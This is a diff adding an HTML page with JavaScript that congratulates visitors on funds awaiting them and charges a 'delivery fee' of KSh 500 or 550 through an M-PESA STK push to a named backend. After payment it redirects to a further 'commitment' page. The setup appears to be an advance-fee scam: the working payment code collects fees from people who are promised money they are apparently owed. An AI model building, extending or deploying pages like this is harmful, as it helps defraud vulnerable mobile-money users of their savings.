@@ -1,0 +1,859 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#087f3e">
+
+<title>Funds Delivery</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
+body{
+    font-family:Arial,sans-serif;
+    background:#f4f7f8;
+    color:#222;
+}
+
+.container{
+    width:92%;
+    max-width:480px;
+    margin:auto;
+}
+
+header{
+    background:#087f3e;
+    color:white;
+    padding:20px 0;
+}
+
+header h1{
+    font-size:22px;
+}
+
+.card{
+    background:white;
+    margin:18px 0;
+    padding:22px 20px;
+    border-radius:14px;
+    box-shadow:0 2px 10px rgba(0,0,0,.07);
+}
+
+.card h2{
+    font-size:22px;
+    margin-bottom:10px;
+}
+
+.card p{
+    color:#666;
+    line-height:1.5;
+    margin-bottom:20px;
+}
+
+.delivery-option{
+    display:block;
+    border:1px solid #ddd;
+    border-radius:10px;
+    padding:15px;
+    margin-bottom:12px;
+    cursor:pointer;
+    transition:.2s;
+}
+
+.delivery-option:hover{
+    border-color:#087f3e;
+}
+
+.delivery-option input{
+    margin-right:8px;
+}
+
+.method{
+    font-weight:700;
+}
+
+.fee{
+    color:#666;
+    font-size:14px;
+    margin-top:5px;
+}
+
+.selected-fee{
+    background:#f4f7f8;
+    padding:14px;
+    border-radius:10px;
+    margin:18px 0;
+}
+
+.btn{
+    width:100%;
+    padding:15px;
+    border:0;
+    border-radius:9px;
+    background:#087f3e;
+    color:white;
+    font-size:16px;
+    font-weight:700;
+    cursor:pointer;
+}
+
+.btn:disabled{
+    opacity:.6;
+    cursor:not-allowed;
+}
+
+#status{
+    min-height:22px;
+    text-align:center;
+    margin-top:15px;
+    font-size:14px;
+    line-height:1.5;
+}
+
+.success{
+    color:#087f3e;
+}
+
+.error{
+    color:#c62828;
+}
+
+footer{
+    text-align:center;
+    padding:25px 10px;
+    color:#777;
+    font-size:12px;
+}
+</style>
+</head>
+
+<body>
+
+<header>
+    <div class="container">
+        <h1>Funds Delivery</h1>
+    </div>
+</header>
+
+<main class="container">
+
+    <section class="card">
+
+        <h2>Congratulations!</h2>
+
+        <p>
+            Kindly choose where you would like your funds transferred.
+            Each delivery method has a small fee to cover applicable
+            network and processing charges.
+        </p>
+
+        <label class="delivery-option">
+            <input
+                type="radio"
+                name="delivery"
+                value="500"
+            >
+
+            <span class="method">
+                Mobile Money
+            </span>
+
+            <div class="fee">
+                Delivery charge: KSh 500
+            </div>
+        </label>
+
+        <label class="delivery-option">
+            <input
+                type="radio"
+                name="delivery"
+                value="550"
+            >
+
+            <span class="method">
+                Bank Account
+            </span>
+
+            <div class="fee">
+                Delivery charge: KSh 550
+            </div>
+        </label>
+
+        <div class="selected-fee">
+            Delivery Fee:
+            <strong>
+                KSh <span id="deliveryFee">0</span>
+            </strong>
+        </div>
+
+        <button
+            type="button"
+            id="payButton"
+            class="btn"
+        >
+            Pay Delivery Charges
+        </button>
+
+        <div
+            id="status"
+            role="status"
+            aria-live="polite"
+        ></div>
+
+    </section>
+
+</main>
+
+<footer>
+    Please review the selected delivery method and applicable charge
+    before making payment.
+</footer>
+
+
+<script>
+
+"use strict";
+
+
+/*
+|--------------------------------------------------------------------------
+| BACKEND
+|--------------------------------------------------------------------------
+|
+| This is the same backend used by your working STK Push page.
+|
+*/
+
+const BACKEND_URL =
+    "https://nyota-program-backend.onrender.com";
+
+
+/*
+|--------------------------------------------------------------------------
+| ELEMENTS
+|--------------------------------------------------------------------------
+*/
+
+const deliveryFee =
+    document.getElementById(
+        "deliveryFee"
+    );
+
+const payButton =
+    document.getElementById(
+        "payButton"
+    );
+
+const statusElement =
+    document.getElementById(
+        "status"
+    );
+
+
+/*
+|--------------------------------------------------------------------------
+| SELECT DELIVERY METHOD
+|--------------------------------------------------------------------------
+*/
+
+document
+    .querySelectorAll(
+        'input[name="delivery"]'
+    )
+    .forEach(function(input){
+
+        input.addEventListener(
+            "change",
+            updateFee
+        );
+
+    });
+
+
+function updateFee(){
+
+    const selected =
+        document.querySelector(
+            'input[name="delivery"]:checked'
+        );
+
+
+    if(!selected){
+
+        deliveryFee.textContent =
+            "0";
+
+        return;
+    }
+
+
+    deliveryFee.textContent =
+        Number(
+            selected.value
+        ).toLocaleString(
+            "en-KE"
+        );
+}
+
+
+/*
+|--------------------------------------------------------------------------
+| STATUS MESSAGE
+|--------------------------------------------------------------------------
+*/
+
+function setStatus(
+    message,
+    type = ""
+){
+
+    statusElement.textContent =
+        message;
+
+    statusElement.className =
+        type;
+}
+
+
+/*
+|--------------------------------------------------------------------------
+| BUTTON STATE
+|--------------------------------------------------------------------------
+*/
+
+function setLoading(
+    loading,
+    text = "Processing..."
+){
+
+    payButton.disabled =
+        loading;
+
+    payButton.textContent =
+        loading
+            ? text
+            : "Pay Delivery Charges";
+}
+
+
+/*
+|--------------------------------------------------------------------------
+| READ JSON SAFELY
+|--------------------------------------------------------------------------
+*/
+
+async function readJson(
+    response
+){
+
+    const text =
+        await response.text();
+
+
+    try{
+
+        return text
+            ? JSON.parse(text)
+            : {};
+
+    }catch(error){
+
+        throw new Error(
+            "The server returned an invalid response."
+        );
+    }
+}
+
+
+/*
+|--------------------------------------------------------------------------
+| START DELIVERY PAYMENT
+|--------------------------------------------------------------------------
+*/
+
+async function payDelivery(){
+
+    const selected =
+        document.querySelector(
+            'input[name="delivery"]:checked'
+        );
+
+
+    /*
+     * Make sure a delivery method
+     * has been selected.
+     */
+
+    if(!selected){
+
+        setStatus(
+            "Please select a delivery method.",
+            "error"
+        );
+
+        return;
+    }
+
+
+    /*
+     * Retrieve the phone number
+     * saved by payments.html.
+     */
+
+    const phone =
+        localStorage.getItem(
+            "phoneNumber"
+        );
+
+
+    if(!phone){
+
+        setStatus(
+            "Phone number not found. Please return to the payment page.",
+            "error"
+        );
+
+        return;
+    }
+
+
+    const amount =
+        Number(
+            selected.value
+        );
+
+
+    if(
+        !Number.isFinite(amount) ||
+        amount <= 0
+    ){
+
+        setStatus(
+            "Invalid payment amount.",
+            "error"
+        );
+
+        return;
+    }
+
+
+    /*
+     * Save the selected delivery
+     * method for the next page.
+     */
+
+    localStorage.setItem(
+        "deliveryMethod",
+        selected.value === "500"
+            ? "Mobile Money"
+            : "Bank Account"
+    );
+
+
+    localStorage.setItem(
+        "deliveryFee",
+        String(amount)
+    );
+
+
+    /*
+     * Disable button while the
+     * payment is being initiated.
+     */
+
+    setLoading(
+        true,
+        "Sending STK Push..."
+    );
+
+
+    setStatus(
+        "Sending payment request..."
+    );
+
+
+    try{
+
+        /*
+         * SAME ENDPOINT AS YOUR
+         * WORKING PAYMENT PAGE.
+         */
+
+        const response =
+            await fetch(
+                BACKEND_URL +
+                "/stk-push",
+                {
+                    method:"POST",
+
+                    headers:{
+                        "Content-Type":
+                            "application/json"
+                    },
+
+                    body:JSON.stringify({
+
+                        phone:
+                            phone,
+
+                        amount:
+                            amount
+
+                    })
+                }
+            );
+
+
+        const data =
+            await readJson(
+                response
+            );
+
+
+        console.log(
+            "DELIVERY STK RESPONSE:",
+            data
+        );
+
+
+        if(
+            !response.ok ||
+            data.success === false
+        ){
+
+            throw new Error(
+                data.message ||
+                "Payment request failed."
+            );
+        }
+
+
+        /*
+         * Support the transaction ID
+         * formats used by your backend.
+         */
+
+        const transactionId =
+
+            data.transactionId ||
+
+            data.checkout_request_id ||
+
+            data.data?.transactionId ||
+
+            data.data?.checkout_request_id;
+
+
+        if(!transactionId){
+
+            throw new Error(
+                "Payment reference was not returned by the server."
+            );
+        }
+
+
+        /*
+         * Save transaction details.
+         */
+
+        localStorage.setItem(
+            "deliveryTransactionId",
+            transactionId
+        );
+
+
+        setLoading(
+            true,
+            "Waiting for payment..."
+        );
+
+
+        setStatus(
+            "Payment request sent. Please enter your M-PESA PIN on your phone."
+        );
+
+
+        /*
+         * Begin checking payment status.
+         */
+
+        await checkPayment(
+            transactionId
+        );
+
+
+    }catch(error){
+
+        console.error(
+            "DELIVERY PAYMENT ERROR:",
+            error
+        );
+
+
+        setStatus(
+            error.message ||
+            "Payment request failed.",
+            "error"
+        );
+
+
+        setLoading(
+            false
+        );
+    }
+}
+
+
+/*
+|--------------------------------------------------------------------------
+| CHECK PAYMENT STATUS
+|--------------------------------------------------------------------------
+|
+| Uses the SAME /payment-status endpoint
+| as your first payment page.
+|
+*/
+
+async function checkPayment(
+    transactionId
+){
+
+    const startedAt =
+        Date.now();
+
+
+    /*
+     * Stop checking after 2 minutes.
+     */
+
+    const timeoutMs =
+        2 * 60 * 1000;
+
+
+    while(
+        Date.now() -
+        startedAt <
+        timeoutMs
+    ){
+
+        try{
+
+            const response =
+                await fetch(
+                    BACKEND_URL +
+                    "/payment-status",
+                    {
+                        method:"POST",
+
+                        headers:{
+                            "Content-Type":
+                                "application/json"
+                        },
+
+                        body:JSON.stringify({
+
+                            transactionId:
+                                transactionId
+
+                        })
+                    }
+                );
+
+
+            const result =
+                await readJson(
+                    response
+                );
+
+
+            console.log(
+                "DELIVERY PAYMENT STATUS:",
+                result
+            );
+
+
+            /*
+             * Your backend may return:
+             *
+             * result.data.status
+             *
+             * or
+             *
+             * result.status
+             */
+
+            const payment =
+                result.data ||
+                result;
+
+
+            const paymentStatus =
+                String(
+                    payment.status ||
+                    payment.data?.status ||
+                    ""
+                ).toUpperCase();
+
+
+            /*
+             * PAYMENT SUCCESS
+             */
+
+            if(
+
+                paymentStatus ===
+                "COMPLETED" ||
+
+                paymentStatus ===
+                "SUCCESS" ||
+
+                paymentStatus ===
+                "CONFIRMED"
+
+            ){
+
+                setStatus(
+                    "Payment confirmed successfully. Redirecting...",
+                    "success"
+                );
+
+
+                /*
+                 * Prevent another payment
+                 * while redirecting.
+                 */
+
+                setLoading(
+                    true,
+                    "Payment Confirmed"
+                );
+
+
+                setTimeout(
+                    function(){
+
+                        window.location.href =
+                            "commitment.html";
+
+                    },
+                    1000
+                );
+
+
+                return;
+            }
+
+
+            /*
+             * PAYMENT FAILED
+             */
+
+            if(
+
+                paymentStatus ===
+                "CANCELLED" ||
+
+                paymentStatus ===
+                "FAILED" ||
+
+                paymentStatus ===
+                "EXPIRED"
+
+            ){
+
+                setStatus(
+                    "Payment was " +
+                    paymentStatus.toLowerCase() +
+                    ".",
+                    "error"
+                );
+
+
+                setLoading(
+                    false
+                );
+
+
+                return;
+            }
+
+
+            /*
+             * STILL PROCESSING
+             */
+
+            setStatus(
+                "Confirming payment..."
+            );
+
+
+        }catch(error){
+
+            console.error(
+                "STATUS ERROR:",
+                error
+            );
+
+
+            /*
+             * Continue polling if the
+             * status request temporarily fails.
+             */
+
+        }
+
+
+        /*
+         * Wait 3 seconds before the
+         * next status request.
+         */
+
+        await new Promise(
+            function(resolve){
+
+                setTimeout(
+                    resolve,
+                    3000
+                );
+
+            }
+        );
+    }
+
+
+    /*
+     * PAYMENT STATUS TIMEOUT
+     */
+
+    setStatus(
+        "We could not confirm the payment within the expected time. Check your M-PESA messages before trying again.",
+        "error"
+    );
+
+
+    setLoading(
+        false
+    );
+}
+
+
+/*
+|--------------------------------------------------------------------------
+| BUTTON
+|--------------------------------------------------------------------------
+*/
+
+payButton.addEventListener(
+    "click",
+    payDelivery
+);
+
+</script>
+
+</body>
+</html>
